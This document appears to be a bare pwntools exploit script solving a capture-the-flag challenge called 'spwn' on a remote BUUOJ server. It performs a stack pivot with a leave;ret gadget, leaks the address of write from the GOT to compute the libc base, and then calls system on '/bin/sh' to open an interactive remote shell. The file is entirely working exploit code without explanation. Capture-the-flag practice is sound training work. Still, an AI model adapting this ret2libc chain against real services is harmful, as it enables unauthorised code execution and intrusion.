from pwn import *

context.log_level = "debug"

exe = ELF("./spwn")
# libc = exe.libc
# r = exe.process()
libc = ELF("./libc-2.23.so")
r = remote("node4.buuoj.cn", 29647)
# 0x08048408 : leave ; ret
leave_ret = p32(0x8048408)
# gdb.attach(r)

r.recvuntil(b"name?")
r.send(
    p32(0)
    + p32(exe.plt["write"])
    + p32(exe.sym["main"])
    + p32(1)
    + p32(exe.got["write"])
    + p32(4)
)
r.recvuntil(b"say?")
r.send(cyclic(24) + p32(exe.sym["s"]) + leave_ret)
libc_write = u32(r.recv(4))
libc_base = libc_write - libc.sym["write"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

r.recvuntil(b"name?")
r.send(p32(0) + p32(libc_system + 4) + p32(exe.sym["main"]) + p32(libc_bin_sh))
r.recvuntil(b"say?")
r.send(cyclic(24) + p32(exe.sym["s"]) + leave_ret)
r.interactive()
